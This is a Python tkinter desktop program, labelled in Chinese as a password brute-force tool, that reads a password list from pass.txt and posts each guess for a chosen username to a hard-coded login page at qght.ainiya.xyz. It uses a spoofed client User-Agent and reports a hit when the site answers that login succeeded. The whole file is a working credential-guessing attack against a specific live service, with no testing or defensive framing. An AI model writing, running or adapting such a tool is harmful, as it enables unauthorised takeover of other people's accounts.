import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
import json
import requests
import os

class PasswordBruteForceDesktop:
    def __init__(self, root):
        self.root = root
        self.root.title("密码爆破工具")
        self.root.geometry("800x600")
        self.root.configure(bg="#121212")
        
        # 创建深色主题
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # 配置深色主题样式
        self.style.configure('.', background="#121212", foreground="#FFFFFF", font=("Arial", 10))
        self.style.configure('TFrame', background="#121212")
        self.style.configure('TLabel', background="#121212", foreground="#FFFFFF")
        self.style.configure('TButton', background="#333333", foreground="#FFFFFF", borderwidth=1)
        self.style.configure('TEntry', fieldbackground="#1E1E1E", foreground="#FFFFFF")
        self.style.configure('Vertical.TScrollbar', background="#333333")
        
        # 创建主框架
        main_frame = ttk.Frame(root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # 用户名输入区域
        input_frame = ttk.Frame(main_frame)
        input_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(input_frame, text="user:", font=("Arial", 12, "bold")).pack(side=tk.LEFT, padx=(0, 5))
        self.username_var = tk.StringVar()
        username_entry = ttk.Entry(input_frame, textvariable=self.username_var, width=30, font=("Arial", 12))
        username_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # 控制按钮区域
        button_frame = ttk.Frame(main_frame)
        button_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.start_button = ttk.Button(
            button_frame, 
            text="开始爆破", 
            command=self.start_brute_force,
            style='Start.TButton'
        )
        self.start_button.pack(side=tk.LEFT, padx=(0, 10))
        
        self.stop_button = ttk.Button(
            button_frame, 
            text="停止", 
            command=self.stop_brute_force, 
            state=tk.DISABLED,
            style='Stop.TButton'
        )
        self.stop_button.pack(side=tk.LEFT)
        
        # 进度条
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(
            main_frame, 
            variable=self.progress_var, 
            maximum=100,
            style='TProgressbar'
        )
        self.progress_bar.pack(fill=tk.X, pady=(0, 10))
        
        # 状态标签
        self.status_var = tk.StringVar(value="准备就绪")
        status_label = ttk.Label(
            main_frame, 
            textvariable=self.status_var,
            font=("Arial", 10),
            foreground="#4CAF50"
        )
        status_label.pack(anchor=tk.W, pady=(0, 5))
        
        # 输出区域框架
        output_frame = ttk.Frame(main_frame)
        output_frame.pack(fill=tk.BOTH, expand=True)
        
        # 输出文本区域
        self.output_text = tk.Text(
            output_frame,
            wrap=tk.WORD,
            font=("Consolas", 10),
            bg="#1E1E1E",
            fg="#FFFFFF",
            insertbackground="white",
            borderwidth=0,
            relief=tk.FLAT
        )
        self.output_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # 滚动条
        scrollbar = ttk.Scrollbar(
            output_frame, 
            orient=tk.VERTICAL, 
            command=self.output_text.yview
        )
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.output_text.config(yscrollcommand=scrollbar.set)
        
        # 配置标签颜色
        self.output_text.tag_config("success", foreground="#4CAF50")
        self.output_text.tag_config("error", foreground="#F44336")
        self.output_text.tag_config("info", foreground="#FFFFFF")
        
        # 自定义按钮样式
        self.style.configure('Start.TButton', background="#4CAF50", foreground="#FFFFFF")
        self.style.configure('Stop.TButton', background="#F44336", foreground="#FFFFFF")
        self.style.configure('TProgressbar', background="#4CAF50", troughcolor="#1E1E1E")
        
        # 爆破状态变量
        self.is_running = False
        self.passwords = []
        self.total_passwords = 0
        self.thread = None
        
        # 自动加载密码
        self.load_passwords()
    
    def load_passwords(self):
        """从 pass.txt 加载密码"""
        password_file = "pass.txt"
        if os.path.exists(password_file):
            try:
                with open(password_file, 'r', encoding="utf-8") as f:
                    self.passwords = [line.strip() for line in f.readlines()]
                    self.total_passwords = len(self.passwords)
                    self.status_var.set(f"密码字典加载完成 ({self.total_passwords} 个密码)")
            except Exception as e:
                self.status_var.set(f"错误: 无法加载密码字典 - {str(e)}")
        else:
            self.status_var.set("警告: 未找到 pass.txt 文件")
    
    def start_brute_force(self):
        """开始爆破过程"""
        username = self.username_var.get().strip()
        if not username:
            self.status_var.set("错误: 请输入用户名")
            return
            
        if self.total_passwords == 0:
            self.status_var.set("错误: 密码字典为空")
            return
            
        # 重置UI状态
        self.is_running = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.progress_var.set(0)
        self.output_text.delete(1.0, tk.END)
        self.status_var.set("正在尝试... 0/0")
        
        # 启动爆破线程
        self.thread = threading.Thread(target=self.brute_force_thread, args=(username,), daemon=True)
        self.thread.start()
    
    def stop_brute_force(self):
        """停止爆破过程"""
        self.is_running = False
        self.status_var.set("已停止")
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
    
    def brute_force_thread(self, username):
        """爆破线程"""
        url = "http://qght.ainiya.xyz/dl.php"
        headers = {
            'User-Agent': "Apache-HttpClient/UNAVAILABLE (java 1.4)",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "identity"
        }
        
        success = False
        account_not_exist = False
        total = self.total_passwords
        
        for i, password in enumerate(self.passwords, 1):
            if not self.is_running:
                break
                
            # 更新进度
            self.update_status(f"正在尝试... {i}/{total}")
            self.update_progress(i, total)
            
            try:
                payload = {'user': username, 'pass': password}
                response = requests.post(url, data=payload, headers=headers, timeout=5)
                
                # 解析JSON响应
                data = response.json()
                
                # 构建格式化输出
                output_lines = []
                for key, value in data.items():
                    output_lines.append(f'"{key}": "{value}"')
                
                output = "\n".join(output_lines)
                
                # 检查是否登录成功
                login_success = data.get('code') == "登录成功"
                account_not_exist = data.get('msg') == "账号不存在"
                
                # 根据结果上色
                if login_success:
                    self.append_output(f"[{i}/{total}] pass:{password}", "success")
                    self.append_output(output, "success")
                    success = True
                elif account_not_exist:
                    self.append_output(f"[{i}/{total}] pass:{password}", "error")
                    self.append_output(output, "error")
                else:
                    self.append_output(f"[{i}/{total}] pass:{password}", "error")
                    self.append_output(output, "error")
                
                # 添加空行
                self.append_output("", "info")
                
                # 如果成功或账号不存在，停止尝试
                if success or account_not_exist:
                    if success:
                        self.update_status("成功找到密码!")
                    else:
                        self.update_status("账号不存在，停止爆破")
                    break
                
                # 短暂延迟
                time.sleep(0.01)
            
            except json.JSONDecodeError:
                self.append_output(f"[{i}/{total}] pass:{password}", "error")
                self.append_output(f"响应不是有效的JSON格式: {response.text}", "error")
                self.append_output("", "info")
            
            except Exception as e:
                self.append_output(f"[{i}/{total}] pass:{password}", "error")
                self.append_output(f"请求失败: {str(e)}", "error")
                self.append_output("", "info")
        
        # 爆破结束处理
        if not success and not account_not_exist and self.is_running:
            self.update_status("所有密码尝试失败")
            
        self.is_running = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
    
    def update_status(self, message):
        """更新状态标签"""
        self.root.after(0, lambda: self.status_var.set(message))
    
    def update_progress(self, current, total):
        """更新进度条"""
        progress = (current * 100) / total
        self.root.after(0, lambda: self.progress_var.set(progress))
    
    def append_output(self, message, tag="info"):
        """添加输出到文本区域"""
        self.root.after(0, lambda: self._append_output(message, tag))
    
    def _append_output(self, message, tag):
        """实际添加输出的方法"""
        self.output_text.insert(tk.END, message + "\n", tag)
        self.output_text.see(tk.END)  # 自动滚动到底部

if __name__ == "__main__":
    root = tk.Tk()
    app = PasswordBruteForceDesktop(root)
    root.mainloop()